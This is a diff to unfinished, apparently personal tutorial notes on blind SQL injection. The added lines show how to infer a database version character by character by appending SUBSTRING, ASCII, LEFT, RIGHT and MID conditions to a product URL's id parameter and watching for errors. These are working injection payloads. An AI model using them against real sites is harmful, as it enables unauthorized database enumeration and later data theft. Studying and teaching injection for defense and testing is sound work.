@@ -159,8 +159,20 @@
   - so, we can do like this,
     1. https://website.com/product/id?=23' and SUBSTRING(version(),1,1)=1
     2. here, `SUBSTRING(version(),1,1)=1` means, get the first letter of version.
-    3. we used, SUBSTRING(version(),***1,1)=1***. means, is first letter of verssion is = to 1 or not?
-    4. 
+     3. we used, SUBSTRING(version(),***1***,1)=***1***. means, is first letter of verssion is = to 1 or not? (`we ca use <,> as well`)
+    4. SUBSTRING(version(),***1***,1)=***1*** <- see, if website is normal or not (means NO ERROR).
+    5. if not, then try, 
+       - SUBSTRING(version(),***1***,1)=***2***,
+       - SUBSTRING(version(),***1***,1)=***3***,
+       - SUBSTRING(version(),***1***,1)=***4***, etc..
+    
+    6. let's suppose, we got normal website on SUBSTRING(version(),***1***,1)=***5***, then we can confirm that first letter of the version is `5`.
+    7. now, it's time to find rest of the numbers of version.
+       - `ascii(SUBSTRING(version(),3,1))=54` (here we used `ASCII` function and `54` means `6`)
+       - `left(version(),1)=5`
+       - `right(version(),1)=1`
+       - `right(left(version(),1),1)=5`
+       - `(select mid(version(),8,1)=8)`
 
 
 **Note:** not completed. to be continued...
